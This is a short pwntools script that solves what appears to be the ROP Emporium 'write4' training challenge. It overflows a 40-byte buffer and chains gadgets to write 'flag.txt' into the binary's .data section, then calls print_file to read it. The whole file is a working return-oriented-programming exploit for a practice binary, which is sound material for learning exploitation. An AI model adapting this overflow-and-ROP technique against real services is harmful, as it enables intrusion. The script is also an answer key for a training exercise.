from pwn import *

context.binary = './write4'

pop_r14_r14 = 0x0000000000400690
addr_data =  0x00601028
mov_r14_r15= 0x0000000000400628
pop_rdi=0x0000000000400693
addr_print_file=0x00400510

offset = 40

payload = b'A' * offset
payload += p64(pop_r14_r14)
payload += p64(addr_data)
payload += b'flag.txt'
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(addr_data)
payload += p64(addr_print_file)

io = process('./write4')
io.sendline(payload)

print(io.recvall().decode())
